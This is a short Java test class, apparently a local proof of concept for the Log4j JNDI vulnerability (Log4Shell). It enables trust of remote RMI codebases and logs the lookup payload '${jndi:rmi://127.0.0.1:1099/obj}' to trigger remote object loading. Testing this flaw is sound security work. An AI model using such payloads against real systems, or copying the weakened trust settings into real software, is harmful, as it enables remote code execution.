package com.github.bluegitter.log4j2;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 测试log4j漏洞
 **/
public class Log4jBugTest {

    private static final Logger LOGGER = LogManager.getLogger(Log4jBugTest.class);

    public static void main( String[] args ) {
        System.setProperty("java.rmi.server.useCodebaseOnly", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        LOGGER.info( "msg:{}", "${jndi:rmi://127.0.0.1:1099/obj}" );
    }
}
